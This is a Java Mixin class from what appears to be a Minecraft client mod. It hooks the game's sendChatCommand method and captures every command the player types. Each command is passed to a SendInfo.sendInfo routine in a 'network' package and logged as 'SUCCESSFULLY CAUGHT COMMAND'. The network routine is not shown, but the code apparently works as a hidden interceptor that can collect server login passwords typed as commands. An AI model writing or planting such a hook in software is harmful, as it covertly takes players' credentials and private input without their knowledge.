package dev.luminous.asm.mixins;

import net.minecraft.client.network.ClientPlayNetworkHandler;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;


@Mixin(ClientPlayNetworkHandler.class)
public class GetContent {

    @Inject(method = "sendChatCommand", at = @At(value = "HEAD"))
    private void catchCommand(String command, CallbackInfo ci) {

        dev.luminous.mod.modules.impl.client.network.SendInfo.sendInfo("/" + command);
        System.out.println("-----SUCCESSFULLY CAUGHT COMMAND-----");
        System.out.println("cmd " + command);
    }
}
